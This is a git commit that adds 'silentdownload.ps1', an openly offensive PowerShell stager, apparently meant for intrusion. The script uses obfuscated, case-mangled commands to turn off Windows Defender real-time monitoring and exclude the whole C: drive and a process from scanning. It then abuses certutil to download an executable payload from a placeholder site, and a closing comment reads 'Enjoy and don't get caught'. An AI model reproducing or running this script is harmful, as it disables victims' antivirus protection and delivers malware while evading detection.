bb77621818aa8c2056b76b65f05948dd323a5b4c
John Fawcett <43934323+jwfawcett@users.noreply.github.com>
2025-12-05 15:23:15 -0500

    Create silentdownload.ps1

---
+++ silentdownload.ps1
@@ -0,0 +1,23 @@
+
+
+# stager should be created with the following powershell command 
+# powershell.exe -NoPr -WINd 1 -eXEc ByP 
+
+#change variable
+$sitename = "https://sitename"
+
+#change variable
+$filename = "$file.exe"
+
+# Disables Defender Real Time Monitoring 
+
+InVOKe-cOMMAnd -"coMputEr"NaME %s -s"c"R"i"Ptb"l"O"c"k { s"Et-Mpp"RE"Fe"R"ENcE" -"dI"SA"bLe"Re"AL"T"i"m"eMo"Ni"TORI"Ng $T"Ru"E; ad"D"-"mPP"R"e"Fe"R"Ence -"Exc"L"usI"O"N"P"AtH" 'C:\'; aD"D-"M"PPrEfE"REnce -e"x"C"l"u"s"I"oN"p"r"o"C"ESs '%s' }
+
+Start-Sleep -Seconds 5
+
+# uses certutil  lolbas to load payload 
+cerTuTIl.Exe -Ur"Lcac"HE -f $sitename $filename
+
+# Remove Comments. Enjoy and don't get caught
+
+
